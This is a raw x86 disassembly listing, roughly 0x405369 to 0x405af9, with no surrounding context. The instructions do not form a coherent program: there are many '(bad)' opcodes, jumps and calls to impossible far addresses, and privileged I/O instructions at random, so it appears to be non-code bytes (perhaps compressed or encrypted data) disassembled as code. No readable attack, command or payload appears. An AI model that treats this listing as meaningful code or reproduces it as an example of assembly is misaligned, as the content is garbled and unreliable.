  405369:	ins    DWORD PTR es:[edi],dx
  40536a:	dec    ebx
  40536b:	cld    
  40536c:	out    0x2b,al
  40536e:	hlt    
  40536f:	mov    dl,0xb8
  405371:	push   es
  405372:	sbb    al,0x93
  405374:	jmp    0x1b51c02
  405379:	sbb    BYTE PTR [ecx+0x2be62f02],dl
  40537f:	pusha  
  405380:	retf   
  405381:	mov    al,0xf5
  405383:	and    BYTE PTR [ebx+0x45],dh
  405386:	xchg   DWORD PTR [eax],edi
  405388:	push   edi
  405389:	repz and edx,ebx
  40538c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40538d:	or     DWORD PTR [edi+eax*2-0x581f8dba],ecx
  405394:	mov    al,0x70
  405396:	out    dx,al
  405397:	stos   DWORD PTR es:[edi],eax
  405398:	sub    DWORD PTR [esi-0x175fc21b],esi
  40539e:	push   edx
  40539f:	xor    dl,BYTE PTR [edi-0x5ca87bdb]
  4053a5:	jle    0x4053a4
  4053a7:	je     0x405356
  4053a9:	push   edx
  4053aa:	sub    eax,0x9efc0c22
  4053af:	pop    esi
  4053b0:	dec    ecx
  4053b1:	or     al,0x8b
  4053b3:	adc    eax,0x175511b
  4053b8:	jae    0x4053d0
  4053ba:	pop    esp
  4053bb:	jns    0x4053ef
  4053bd:	test   BYTE PTR [ebp-0x3a],dl
  4053c0:	push   es
  4053c1:	jmp    0x5a5bbece
  4053c6:	fisubr WORD PTR [ebx+0x55f3c2b5]
  4053cc:	(bad)
  4053cf:	sbb    al,0x3a
  4053d1:	dec    eax
  4053d2:	fistp  QWORD PTR [esi]
  4053d4:	cmp    eax,0x9bd0ad83
  4053d9:	(bad)  
  4053da:	jg     0x405373
  4053dc:	sbb    BYTE PTR [esi],cl
  4053de:	fcomp  DWORD PTR [ebp-0x7c]
  4053e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053e2:	test   DWORD PTR [ebx+0x7],ecx
  4053e5:	cs nop
  4053e7:	aam    0x77
  4053e9:	loope  0x40544f
  4053eb:	and    eax,edx
  4053ed:	adc    BYTE PTR [esp+edi*2],dh
  4053f0:	lock mov esi,0x4583c964
  4053f6:	inc    esp
  4053f7:	retf   0xef81
  4053fa:	mov    DWORD PTR [esi],ecx
  4053fc:	mov    dl,0xac
  4053fe:	out    0xb7,al
  405400:	call   DWORD PTR [eax-0x5a9ed422]
  405406:	dec    eax
  405407:	sub    eax,0x69121079
  40540c:	in     al,dx
  40540d:	pop    ebp
  40540e:	fld    QWORD PTR [esi]
  405410:	out    dx,eax
  405411:	pop    ebx
  405412:	and    DWORD PTR [edi+0x156b0d38],ecx
  405418:	dec    edi
  405419:	stos   BYTE PTR es:[edi],al
  40541a:	adc    ecx,esi
  40541c:	inc    ecx
  40541d:	je     0x4053ca
  40541f:	scas   eax,DWORD PTR es:[edi]
  405420:	aad    0xbd
  405422:	xor    BYTE PTR [esi+0x30],dl
  405425:	sar    BYTE PTR [edi-0x282837ec],cl
  40542b:	pop    eax
  40542c:	sahf   
  40542d:	push   eax
  40542e:	pushf  
  40542f:	shr    bl,0x9b
  405432:	sub    dh,BYTE PTR [eax-0x4436d46a]
  405438:	test   DWORD PTR [edi],esi
  40543a:	test   BYTE PTR [edx-0xa54597],ah
  405440:	push   ebp
  405441:	mov    esp,0xe4cd6d2d
  405446:	enter  0xeda5,0xad
  40544a:	dec    esp
  40544b:	add    BYTE PTR [esi+0x3086deca],0xac
  405452:	aam    0xdf
  405454:	mov    edx,0x648976ba
  405459:	nop    DWORD PTR [eax]
  40545c:	adc    BYTE PTR ds:0xda01ae5b,0xa1
  405463:	or     bh,BYTE PTR [ebx]
  405465:	pop    edx
  405466:	push   ss
  405467:	or     ch,BYTE PTR [ebp+0x5010dcbf]
  40546d:	int    0x3c
  40546f:	pop    esp
  405470:	xchg   edi,eax
  405471:	enter  0xe680,0xd0
  405475:	cmp    al,0x4d
  405477:	(bad)  [edx+0x57916a0c]
  40547d:	cld    
  40547e:	lahf   
  40547f:	in     eax,0x8d
  405481:	sbb    al,0x13
  405483:	nop
  405484:	aam    0x18
  405486:	ficomp DWORD PTR ds:[ecx]
  405489:	xor    al,0x62
  40548b:	lods   al,BYTE PTR ds:[esi]
  40548c:	xchg   esp,eax
  40548d:	gs jp  0x40549b
  405490:	mov    ds:0x52b3dd00,eax
  405495:	pop    es
  405496:	add    ebp,esp
  405498:	jmp    0x405428
  40549a:	cmp    DWORD PTR [edi-0x2f],0xffffff89
  40549e:	add    bh,BYTE PTR [esi]
  4054a0:	xchg   edi,eax
  4054a1:	sub    BYTE PTR [ebp-0x2f],ch
  4054a4:	mov    eax,0xe7fc760d
  4054a9:	or     eax,0xf134aa47
  4054ae:	mov    DWORD PTR [esi-0x11ce7412],ebx
  4054b4:	scas   al,BYTE PTR es:[edi]
  4054b5:	sbb    eax,0x59106e99
  4054ba:	out    dx,al
  4054bb:	sbb    BYTE PTR [ecx],bl
  4054bd:	repnz dec ebp
  4054bf:	push   DWORD PTR [edx]
  4054c1:	xchg   ebx,eax
  4054c2:	push   ds
  4054c3:	xor    al,0xe6
  4054c5:	adc    al,0x10
  4054c7:	add    bh,ch
  4054c9:	in     eax,dx
  4054ca:	ret    0x7178
  4054cd:	repnz or eax,0x5a2bb942
  4054d3:	jns    0x405528
  4054d5:	das    
  4054d6:	js     0x40551f
  4054d8:	ins    DWORD PTR es:[edi],dx
  4054d9:	add    ch,0xce
  4054dc:	xlat   BYTE PTR ds:[ebx]
  4054dd:	xchg   esi,eax
  4054de:	xchg   ebp,eax
  4054df:	jge    0x405522
  4054e1:	pop    es
  4054e2:	push   esi
  4054e3:	imul   ebp,DWORD PTR [edi+edi*1],0x553cec10
  4054ea:	push   cs
  4054eb:	inc    esp
  4054ec:	add    eax,0x508c79a3
  4054f1:	xor    bl,BYTE PTR ds:0x5a7d223c
  4054f7:	imul   DWORD PTR [eax-0x5a]
  4054fa:	daa    
  4054fb:	sub    sp,sp
  4054fe:	adc    DWORD PTR [eax],0x32
  405501:	call   0xfd2:0x43b8fe81
  405508:	sbb    esi,DWORD PTR [ecx-0x27]
  40550b:	xor    al,0xd6
  40550d:	stos   BYTE PTR es:[edi],al
  40550e:	or     BYTE PTR [ebp+0x43a2687e],ch
  405514:	lods   eax,DWORD PTR ds:[esi]
  405515:	cmp    ebx,DWORD PTR [eax]
  405517:	xchg   esi,eax
  405518:	dec    ebx
  405519:	inc    ecx
  40551a:	out    0xd8,al
  40551c:	cmp    bh,BYTE PTR [ecx+0x34]
  40551f:	sub    eax,0xca23bb0a
  405524:	outs   dx,DWORD PTR ds:[esi]
  405525:	mov    WORD PTR [edi-0x1],cs
  405528:	sbb    ebx,DWORD PTR [eax]
  40552a:	ins    DWORD PTR es:[edi],dx
  40552b:	xor    dl,0x51
  40552e:	mov    dl,0xef
  405530:	mov    ebx,0x7a53fe05
  405535:	cmp    al,0xb8
  405537:	mov    cl,0xbc
  405539:	mov    ah,0x52
  40553b:	fsub   DWORD PTR [edi-0x3ebf21c1]
  405541:	aad    0xcf
  405543:	lods   eax,DWORD PTR ds:[esi]
  405544:	mov    esi,0x47d19d8e
  405549:	mov    ds:0xe16599ca,al
  40554e:	leave  
  40554f:	adc    DWORD PTR [ebx+edi*4+0x6],edi
  405553:	cmp    dl,BYTE PTR [eax]
  405555:	bound  edi,QWORD PTR [ecx+0x5917a7ba]
  40555b:	minpd  xmm1,XMMWORD PTR [edi]
  40555f:	cmp    eax,0xf971160d
  405564:	dec    esi
  405565:	jmp    FWORD PTR es:[ebp+0x60]
  405569:	jge    0x4055a7
  40556b:	int3   
  40556c:	push   ecx
  40556d:	dec    ecx
  40556e:	push   esi
  40556f:	xchg   esp,eax
  405570:	push   esp
  405571:	cmp    BYTE PTR [edi],cl
  405573:	call   0xd8c7c182
  405578:	push   ecx
  405579:	sahf   
  40557a:	push   esi
  40557b:	xchg   BYTE PTR [ecx],ch
  40557d:	pop    DWORD PTR [ebx+0x3f]
  405580:	pop    edx
  405581:	and    ax,0x8628
  405585:	push   ss
  405586:	mov    dh,0xe8
  405588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405589:	(bad)  
  40558a:	(bad)  
  40558b:	cwde   
  40558c:	data16 gs add al,0xbf
  405590:	push   0x39
  405592:	scas   eax,DWORD PTR es:[edi]
  405593:	mov    edi,DWORD PTR [ecx]
  405595:	or     DWORD PTR [edx],edx
  405597:	rcr    BYTE PTR ds:0x626c162c,1
  40559d:	das    
  40559e:	ins    BYTE PTR es:[edi],dx
  40559f:	cmp    esi,DWORD PTR [ecx+ebx*2-0x3f]
  4055a3:	shr    DWORD PTR [eax+0x6c3125df],cl
  4055a9:	stc    
  4055aa:	aaa    
  4055ab:	mov    ch,0x28
  4055ad:	mov    ch,0xba
  4055af:	(bad)  
  4055b0:	call   DWORD PTR [eax-0x7e]
  4055b3:	(bad)  
  4055b4:	std    
  4055b5:	mov    edi,0x546c2050
  4055ba:	dec    BYTE PTR [eax]
  4055bc:	push   esp
  4055bd:	sub    al,0x5a
  4055bf:	in     al,dx
  4055c0:	(bad)  
  4055c1:	loope  0x40558c
  4055c3:	push   edx
  4055c4:	fstp   DWORD PTR [ebp+ecx*4-0x269ef8ce]
  4055cb:	das    
  4055cc:	arpl   si,ax
  4055ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055cf:	(bad)  
  4055d0:	clc    
  4055d1:	call   0x9d08bca
  4055d6:	or     edi,ebp
  4055d8:	imul   edx,DWORD PTR [edx+0x6c],0xcfd0695c
  4055df:	sbb    al,0xae
  4055e1:	cmp    al,0x2a
  4055e3:	dec    ebp
  4055e4:	dec    ecx
  4055e5:	adc    eax,0xea230181
  4055ea:	test   al,0x2e
  4055ec:	push   esp
  4055ed:	ja     0x4055c4
  4055ef:	xor    al,0x39
  4055f1:	jecxz  0x4055fa
  4055f3:	or     esi,edx
  4055f5:	in     eax,dx
  4055f6:	jb     0x4055c2
  4055f8:	xor    BYTE PTR [edx-0x60],cl
  4055fb:	std    
  4055fc:	pop    edx
  4055fd:	inc    edi
  4055fe:	sub    al,al
  405600:	int3   
  405601:	mov    dl,0xb1
  405604:	cmp    eax,0x6d241bac
  405609:	mov    esp,0xba199634
  40560e:	and    eax,DWORD PTR [eax+0x22d20c24]
  405614:	pusha  
  405615:	aad    0x18
  405617:	push   eax
  405618:	lock mov edx,DWORD PTR [ebp+0x69]
  40561c:	test   BYTE PTR [esi+0x782de9a3],0xd2
  405623:	push   0xffffffcb
  405625:	cmp    cl,BYTE PTR [ecx]
  405627:	std    
  405628:	in     al,dx
  405629:	shl    DWORD PTR [edx+esi*1],cl
  40562c:	cmp    eax,0x1194a86c
  405631:	bswap  ecx
  405633:	sub    eax,0x754a6ff2
  405638:	add    ebx,esp
  40563a:	mov    ah,0xde
  40563c:	(bad)
  405640:	inc    ebp
  405641:	test   BYTE PTR [edx+ebx*8-0x31],ah
  405645:	data16 jp 0x4055d1
  405648:	out    dx,eax
  405649:	inc    ebp
  40564a:	rol    ebx,cl
  40564c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40564d:	or     al,0xb7
  40564f:	sbb    al,bh
  405651:	dec    eax
  405652:	xor    al,0x59
  405654:	sub    eax,0x5a677f9
  405659:	pop    eax
  40565a:	push   cs
  40565b:	push   ds
  40565c:	int3   
  40565d:	mov    ds:0x4e7db88c,al
  405662:	out    dx,eax
  405663:	repnz push ecx
  405665:	shl    bl,1
  405667:	imul   edi,DWORD PTR [edi*4+0x57f5a5da],0xf8a6e9ef
  405672:	lahf   
  405673:	sub    al,ah
  405675:	mov    esi,0xbc6618bc
  40567a:	lock nop
  40567c:	popa   
  40567d:	push   esp
  40567e:	in     al,0x26
  405680:	push   edx
  405681:	sbb    cl,ah
  405683:	and    DWORD PTR [edi-0x24],esp
  405686:	xchg   ebx,eax
  405687:	push   eax
  405688:	jbe    0x4056d1
  40568a:	or     eax,0x4c3443b9
  40568f:	lods   al,BYTE PTR ds:[esi]
  405690:	inc    ecx
  405691:	and    DWORD PTR [eax-0x48],edx
  405694:	mov    ch,0x95
  405696:	xchg   BYTE PTR [esi+edi*4],bl
  405699:	jg     0x4056f5
  40569b:	and    DWORD PTR [ebx],ebx
  40569d:	pop    edi
  40569e:	addr16 imul ecx,esi,0xf
  4056a2:	xor    esp,esp
  4056a4:	add    edi,edx
  4056a6:	and    cl,BYTE PTR [ebp+0x18cdecab]
  4056ac:	retf   
  4056ad:	and    eax,edx
  4056af:	jle    0x4056ca
  4056b1:	(bad)  
  4056b2:	aaa    
  4056b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056b4:	rol    BYTE PTR [eax],0xea
  4056b7:	xchg   esi,eax
  4056b8:	in     al,dx
  4056b9:	inc    eax
  4056ba:	test   DWORD PTR [ebp+0x4b74be26],edx
  4056c0:	dec    edx
  4056c1:	mov    eax,ds:0x7a6239c8
  4056c6:	sub    esi,ebp
  4056c8:	cs aas 
  4056ca:	xchg   ebp,eax
  4056cb:	xchg   ebx,eax
  4056cc:	mov    ebx,0x22bd29e
  4056d1:	sub    al,al
  4056d3:	adc    BYTE PTR [ebx+eax*1],bh
  4056d6:	sub    eax,DWORD PTR [edx+0x55e1749b]
  4056dc:	in     eax,0x52
  4056de:	test   bl,ah
  4056e0:	xor    BYTE PTR [ecx+0x5075ae97],bl
  4056e6:	out    0xc3,eax
  4056e8:	xchg   ecx,eax
  4056e9:	mov    ah,0x67
  4056eb:	nop
  4056ec:	pop    edi
  4056ee:	ror    DWORD PTR [ebx-0x105bd18b],1
  4056f4:	adc    dh,ch
  4056f6:	mov    ecx,0xe1c2a844
  4056fb:	pop    ebp
  4056fc:	jns    0x405744
  4056fe:	and    DWORD PTR [edx+0x35f3a13e],edx
  405704:	(bad)
  405707:	or     dl,dh
  405709:	icebp  
  40570a:	and    BYTE PTR [edx],ch
  40570c:	in     eax,0x25
  40570e:	push   ss
  40570f:	ficomp WORD PTR [ebx-0x10]
  405712:	cmp    ecx,DWORD PTR [ebx]
  405714:	test   al,0xcc
  405716:	clc    
  405717:	and    DWORD PTR [ebx-0x13],edx
  40571a:	fst    DWORD PTR [edx]
  40571c:	xchg   edi,eax
  40571d:	lea    ebx,[eax-0x30115324]
  405723:	jle    0x40575d
  405725:	or     DWORD PTR [edi-0x15],esi
  405728:	or     BYTE PTR [esi+0x78b73179],dh
  40572e:	jne    0x405776
  405730:	push   esi
  405731:	(bad)  
  405732:	cmp    dl,dh
  405734:	nop
  405735:	mov    eax,ds:0x965b31e5
  40573a:	shr    ebx,cl
  40573c:	jae    0x405742
  40573e:	jecxz  0x4056c0
  405740:	xor    al,0xb2
  405742:	adc    BYTE PTR [edi],dl
  405744:	jmp    0x40570f
  405746:	jge    0x40576e
  405748:	cmp    BYTE PTR [eax+0x5],ah
  40574b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40574c:	push   esp
  40574d:	sub    DWORD PTR [eax-0x1d],ebp
  405750:	sbb    dl,BYTE PTR [eax+eiz*4+0x31d30e00]
  405757:	push   ebp
  405758:	pop    ss
  405759:	icebp  
  40575a:	push   esi
  40575b:	xor    bh,BYTE PTR [esi-0x4bb8090d]
  405761:	imul   edx,DWORD PTR [ebp+0x46bc7e60],0xffffff8c
  405768:	xchg   esi,eax
  405769:	pop    edx
  40576a:	in     eax,dx
  40576b:	jae    0x405793
  40576d:	pop    ebp
  40576e:	sub    esp,DWORD PTR [ecx-0x2c462472]
  405774:	or     DWORD PTR [ebx+0x6f],edi
  405777:	or     al,0xc8
  405779:	aaa    
  40577a:	xor    bl,0xdd
  40577d:	test   eax,0x346ee27e
  405782:	dec    ebp
  405783:	dec    ebp
  405784:	sbb    DWORD PTR [ecx],ebp
  405786:	(bad)  
  405787:	mov    ds:0xf54b3a5,al
  40578c:	mov    edi,0xf6b4c837
  405791:	(bad)  
  405792:	jge    0x4057a9
  405794:	lods   eax,DWORD PTR ds:[esi]
  405795:	sub    DWORD PTR [ebp+esi*8+0x74fa2ec0],ebx
  40579c:	xchg   edi,eax
  40579d:	inc    ebp
  40579e:	mov    ds:0x2b2ac66e,eax
  4057a3:	jne    0x405732
  4057a5:	les    edx,FWORD PTR [ebp+0x21278ec7]
  4057ab:	aam    0x54
  4057ad:	inc    ebp
  4057ae:	jg     0x40577d
  4057b0:	push   esp
  4057b1:	in     eax,dx
  4057b2:	dec    edx
  4057b3:	mov    ah,0x5e
  4057b5:	ins    DWORD PTR es:[edi],dx
  4057b6:	lahf   
  4057b7:	add    esp,ebp
  4057b9:	or     DWORD PTR [ebx+0x35],esp
  4057bc:	xor    bh,dh
  4057be:	lahf   
  4057bf:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4057c1:	mov    cl,0x8e
  4057c3:	(bad)  
  4057c4:	bound  ebx,QWORD PTR [ebx-0x52]
  4057c7:	mov    ch,BYTE PTR [edx-0x326be173]
  4057cd:	sub    ch,BYTE PTR ds:0xa9bcf89d
  4057d3:	outs   dx,DWORD PTR ds:[esi]
  4057d4:	jl     0x405845
  4057d6:	jmp    0x9050:0x655d0efd
  4057dd:	std    
  4057de:	lock dec eax
  4057e0:	addr16 in al,dx
  4057e2:	repnz mov edi,ss
  4057e5:	cmp    ebx,eax
  4057e7:	cli    
  4057e8:	(bad)  
  4057eb:	jle    0x405800
  4057ed:	(bad)  
  4057ef:	add    ch,dh
  4057f1:	pop    edi
  4057f2:	xchg   ecx,eax
  4057f3:	out    0x41,al
  4057f5:	sbb    al,0x5a
  4057f7:	mov    esp,0x2e2bffb4
  4057fc:	cmp    DWORD PTR [edx-0x1a10e8],edx
  405802:	loopne 0x4057c5
  405804:	mov    DWORD PTR [edx-0x4b1d7354],esi
  40580a:	jmp    0x5b19b32d
  40580f:	mov    al,ds:0x325cdc42
  405814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405815:	fnsetpm(287 only) 
  405817:	(bad)  
  405819:	ror    DWORD PTR [ebx+0x10],1
  40581c:	fdiv   QWORD PTR [edi]
  40581e:	xor    ebp,DWORD PTR [ebp-0x7b]
  405821:	sub    eax,0x21c4552f
  405826:	add    bh,BYTE PTR [esi+0x3489eeef]
  40582c:	xor    BYTE PTR [eax],0x48
  40582f:	mov    ds:0x6449a029,eax
  405834:	add    esp,edx
  405836:	mov    cl,0x11
  405838:	scas   eax,DWORD PTR es:[edi]
  405839:	dec    ebp
  40583a:	sub    BYTE PTR [esi+eax*8-0xaa0de40],dl
  405841:	add    dl,bl
  405843:	cs es adc eax,0x6999065
  40584a:	lahf   
  40584b:	(bad)  
  40584c:	jl     0x4058c7
  40584e:	pop    es
  40584f:	fnstcw WORD PTR [ebx+edx*2]
  405852:	and    ebp,DWORD PTR [esi+0x1032972a]
  405858:	adc    BYTE PTR [eax-0x35],bl
  40585b:	rol    bl,1
  40585d:	push   ebp
  40585e:	mov    al,ds:0x5fabdb27
  405863:	ds jmp 0x732eefaf
  405869:	sbb    dl,BYTE PTR [edx+ebx*4-0x3e539512]
  405870:	cld    
  405871:	xor    DWORD PTR [eax-0x3e],0x39e9f8bb
  405878:	cld    
  405879:	enter  0xb41f,0x1b
  40587d:	js     0x40581f
  40587f:	dec    esi
  405880:	cmp    BYTE PTR [ecx+0x4e],ch
  405883:	ins    BYTE PTR es:[edi],dx
  405884:	dec    ecx
  405885:	or     ah,bh
  405887:	adc    DWORD PTR [esi],ecx
  405889:	or     al,0x55
  40588b:	xor    cl,BYTE PTR [edx]
  40588d:	pusha  
  40588e:	fadd   st(0),st
  405890:	jp     0x405872
  405892:	(bad)  
  405893:	rol    BYTE PTR [esi+0xb],cl
  405896:	pop    ebx
  405897:	leave  
  405898:	cmp    al,0x63
  40589a:	mov    BYTE PTR [esp+0x5b1aafa8],bl
  4058a1:	iret   
  4058a2:	lock xchg esp,eax
  4058a4:	sub    DWORD PTR [ecx+edx*8+0x6],ebx
  4058a8:	outs   dx,DWORD PTR ds:[esi]
  4058a9:	xchg   esi,eax
  4058aa:	jnp    0x40585b
  4058ac:	mov    dl,bh
  4058ae:	sub    esi,DWORD PTR [ecx-0x22187ae7]
  4058b4:	adc    dl,bh
  4058b6:	ror    DWORD PTR [eax-0x1be2fa09],0x4b
  4058bd:	add    eax,0x888869f0
  4058c2:	outs   dx,DWORD PTR ds:[esi]
  4058c3:	adc    BYTE PTR [ebx],dl
  4058c5:	adc    DWORD PTR [ebx+0x36f9b83f],edi
  4058cb:	es (bad) 
  4058cd:	and    DWORD PTR [eax],edx
  4058cf:	outs   dx,DWORD PTR ds:[esi]
  4058d0:	xchg   esp,eax
  4058d1:	mov    WORD PTR [ecx],es
  4058d3:	sahf   
  4058d4:	popf   
  4058d5:	out    dx,al
  4058d6:	and    ch,BYTE PTR [edi+0x694d8fa9]
  4058dc:	dec    esi
  4058dd:	lock enter 0xf366,0xcc
  4058e2:	pusha  
  4058e3:	cdq    
  4058e4:	je     0x405920
  4058e6:	das    
  4058e7:	(bad)  
  4058e8:	sahf   
  4058e9:	loopne 0x4058f4
  4058eb:	stos   BYTE PTR es:[edi],al
  4058ec:	das    
  4058ed:	das    
  4058ee:	xchg   ebx,eax
  4058ef:	ja     0x4058b8
  4058f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058f2:	jno    0x40594d
  4058f4:	push   esi
  4058f5:	jmp    0xac02cde0
  4058fa:	mov    edi,0x68ebddb2
  4058ff:	inc    esi
  405900:	dec    eax
  405901:	sub    ecx,eax
  405903:	sbb    BYTE PTR [edx+0x768680d7],ah
  405909:	imul   edi,DWORD PTR [edi],0x83e814d3
  40590f:	leave  
  405910:	inc    esi
  405911:	pushf  
  405912:	xchg   esp,eax
  405913:	test   al,0x3d
  405915:	mov    ebx,0xcef65cb9
  40591a:	add    esi,edx
  40591c:	mov    bl,0xf7
  40591e:	mov    esi,ebx
  405920:	jnp    0x4058a2
  405922:	scas   eax,DWORD PTR es:[edi]
  405923:	jne    0x40596c
  405925:	sub    eax,DWORD PTR [eax+0x4f]
  405928:	sbb    dh,ah
  40592a:	out    dx,al
  40592b:	inc    edi
  40592c:	xchg   esp,eax
  40592d:	fs stos DWORD PTR es:[edi],eax
  40592f:	stos   DWORD PTR es:[edi],eax
  405930:	lds    esp,FWORD PTR [ecx+0x4c]
  405933:	fmul   DWORD PTR [ebp+ebx*2-0x27]
  405937:	jge    0x40599f
  405939:	jno    0x40596f
  40593b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40593c:	xor    BYTE PTR [edx+0x2d],0xde
  405940:	out    0x71,eax
  405942:	scas   eax,DWORD PTR es:[edi]
  405943:	imul   edx,DWORD PTR [ebx+0x65587cad],0xf191eac5
  40594d:	pop    esp
  40594e:	jle    0x405993
  405950:	mov    cs,WORD PTR [esi-0x2b8f4bf5]
  405956:	shr    edi,1
  405958:	gs dec esp
  40595a:	mov    edx,0x1947a8d6
  40595f:	xchg   ebp,eax
  405960:	fwait
  405961:	fs adc dh,ah
  405964:	lahf   
  405965:	pop    eax
  405966:	adc    cl,bh
  405968:	iret   
  405969:	das    
  40596a:	inc    esi
  40596b:	cmp    edi,esi
  40596d:	shl    DWORD PTR ds:0xdc215c17,0x10
  405974:	cwde   
  405975:	mov    esi,0x7163628d
  40597a:	stos   BYTE PTR es:[edi],al
  40597b:	sub    BYTE PTR [ebx+edi*1+0x5648e3f],ah
  405982:	mov    ah,0x14
  405984:	jmp    0xbff7:0x6d4486e5
  40598b:	add    ecx,edx
  40598d:	mov    dh,0x45
  40598f:	xchg   esp,eax
  405990:	ins    BYTE PTR es:[edi],dx
  405991:	pop    ebp
  405992:	mov    ch,0xea
  405994:	icebp  
  405995:	pop    eax
  405996:	(bad)  
  405997:	test   eax,0x1e38b6c6
  40599c:	jl     0x40592f
  40599e:	jbe    0x4059e5
  4059a0:	sbb    BYTE PTR [edx+0x19753dfa],0xa2
  4059a7:	mov    WORD PTR [edx-0x63],es
  4059aa:	push   esp
  4059ab:	out    dx,al
  4059ac:	inc    ebp
  4059ad:	ins    BYTE PTR es:[edi],dx
  4059ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059af:	out    0xe3,eax
  4059b1:	popf   
  4059b2:	(bad)
  4059b6:	mov    ebx,0x5089b6d4
  4059bb:	into   
  4059bc:	sub    ah,al
  4059be:	lods   eax,DWORD PTR ds:[esi]
  4059bf:	pop    ds
  4059c0:	scas   al,BYTE PTR es:[edi]
  4059c1:	inc    ecx
  4059c2:	sti    
  4059c3:	xchg   edi,eax
  4059c4:	jbe    0x40597f
  4059c6:	sub    DWORD PTR [edx-0x4d],edx
  4059c9:	test   eax,0xa54654d8
  4059ce:	or     BYTE PTR [ebp+esi*1-0x1340a029],dh
  4059d5:	scas   eax,DWORD PTR es:[edi]
  4059d6:	xor    eax,0x9649b92a
  4059db:	xor    edi,ebp
  4059dd:	lods   eax,DWORD PTR ds:[esi]
  4059de:	ja     0x405997
  4059e0:	mov    ah,0x7a
  4059e2:	mov    WORD PTR [ecx],?
  4059e4:	jns    0x405975
  4059e6:	pop    esp
  4059e7:	mov    ebx,0x7c6722f3
  4059ec:	pushf  
  4059ed:	push   edx
  4059ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059ef:	out    0xc3,eax
  4059f1:	and    ebx,DWORD PTR [ecx]
  4059f3:	mov    dh,0xd1
  4059f5:	ret    0xee27
  4059f8:	add    DWORD PTR [eax-0x35be880b],esp
  4059fe:	out    dx,eax
  4059ff:	into   
  405a00:	dec    esp
  405a01:	push   edi
  405a02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a03:	mov    cl,BYTE PTR [eax+ebp*8-0x55]
  405a07:	mov    BYTE PTR [edx+ebx*8],dl
  405a0a:	push   edi
  405a0b:	jecxz  0x405a1d
  405a0d:	sbb    al,0x25
  405a0f:	xchg   edi,eax
  405a10:	jmp    0x40f2:0x23da4222
  405a17:	outs   dx,DWORD PTR ds:[esi]
  405a18:	push   eax
  405a19:	and    eax,DWORD PTR [ebp+0x55b8e33d]
  405a1f:	ss hlt 
  405a21:	xchg   ebp,eax
  405a22:	(bad)  
  405a23:	push   cs
  405a24:	(bad)  
  405a25:	enter  0x115,0x64
  405a29:	sar    DWORD PTR [ebx-0x22],cl
  405a2c:	pop    esp
  405a2d:	mov    bl,0xad
  405a2f:	nop
  405a30:	push   cs
  405a31:	fld    TBYTE PTR [eax+ebx*2+0x5c]
  405a35:	sbb    al,0x3a
  405a37:	iret   
  405a38:	cmp    DWORD PTR [edx],eax
  405a3a:	push   ss
  405a3b:	push   ebp
  405a3c:	loope  0x4059c3
  405a3e:	outs   dx,BYTE PTR ds:[esi]
  405a3f:	pop    ss
  405a40:	mov    al,0x9c
  405a42:	sbb    BYTE PTR [ebx-0x5b],cl
  405a45:	mov    ebx,DWORD PTR [ebx-0x19b4f37]
  405a4b:	xchg   esp,eax
  405a4c:	std    
  405a4d:	mov    al,0x50
  405a4f:	outs   dx,BYTE PTR fs:[esi]
  405a51:	jecxz  0x405aac
  405a53:	jnp    0x405a09
  405a55:	loop   0x405a5c
  405a57:	mov    bh,0xe9
  405a59:	inc    ebx
  405a5a:	adc    ebp,edi
  405a5c:	scas   al,BYTE PTR es:[edi]
  405a5d:	xchg   ebp,eax
  405a5e:	aam    0xe6
  405a60:	push   ds
  405a61:	and    al,0x0
  405a63:	je     0x405a2d
  405a65:	aam    0xb8
  405a67:	push   esp
  405a68:	or     bh,ah
  405a6a:	mov    edx,0x4982672a
  405a6f:	fnstcw WORD PTR [ebp+0x72547a5e]
  405a75:	xchg   edi,eax
  405a76:	push   ebx
  405a77:	(bad)  
  405a78:	mov    al,0xa0
  405a7a:	dec    esi
  405a7b:	(bad)  
  405a7c:	std    
  405a7d:	scas   eax,DWORD PTR es:[edi]
  405a7e:	dec    esp
  405a7f:	mov    bl,0x6b
  405a81:	add    eax,0x59b2298
  405a86:	mov    edi,0xf58f8b59
  405a8b:	inc    esi
  405a8c:	mov    al,0x9
  405a8e:	sti    
  405a8f:	add    DWORD PTR [ecx-0x298f2a4f],edx
  405a95:	adc    dh,BYTE PTR [ecx+0x535868ed]
  405a9b:	shr    BYTE PTR [ebx+0x251b019d],cl
  405aa1:	xchg   esp,eax
  405aa2:	mov    edi,0xaabcd17e
  405aa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405aa8:	loop   0x405b24
  405aaa:	add    BYTE PTR [edi+0x35b80b4f],bl
  405ab0:	leave  
  405ab1:	push   ebp
  405ab2:	shld   ebx,ebp,cl
  405ab5:	push   ss
  405ab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ab7:	or     al,0x2e
  405ab9:	xchg   esp,eax
  405aba:	(bad)  
  405abb:	out    0xd4,eax
  405abd:	inc    ebp
  405abe:	xlat   BYTE PTR ds:[ebx]
  405abf:	pop    eax
  405ac0:	popf   
  405ac1:	cmp    esp,DWORD PTR [ebp+0x25]
  405ac4:	mov    edx,DWORD PTR [esi-0x306c0b5c]
  405aca:	pop    es
  405acb:	ins    DWORD PTR es:[edi],dx
  405acc:	call   0x8cce:0x49976416
  405ad3:	rol    DWORD PTR [edi-0x1b3ba377],cl
  405ad9:	aad    0x2
  405adb:	xchg   ecx,eax
  405adc:	jne    0x405a77
  405ade:	aas    
  405adf:	out    0x22,eax
  405ae1:	icebp  
  405ae2:	jge    0x405aa7
  405ae4:	call   0x7b57cdf4
  405ae9:	cmp    DWORD PTR [ebp-0xa],esi
  405aec:	fs cmp eax,0xf075dd3f
  405af2:	pop    esp
  405af3:	div    BYTE PTR [ebx-0x7837aa49]
  405af9:	push   edi
